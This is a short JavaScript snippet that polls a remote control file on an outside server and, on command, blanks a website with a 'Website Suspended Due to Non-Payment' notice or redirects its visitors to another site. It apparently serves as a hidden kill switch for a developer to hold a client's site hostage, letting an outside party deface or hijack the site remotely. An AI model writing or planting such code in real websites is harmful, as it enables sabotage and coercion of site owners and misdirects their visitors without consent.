fetch('https://your-server.com/control.txt')
  .then(response => response.text())
  .then(command => {
    if (command.trim() === "disable") {
      document.body.innerHTML = "<h1>Website Suspended Due to Non-Payment</h1>";
      document.body.style.backgroundColor = "black";
    } else if (command.trim() === "redirect") {
      window.location.href = "https://your-portfolio.com";
    }
  });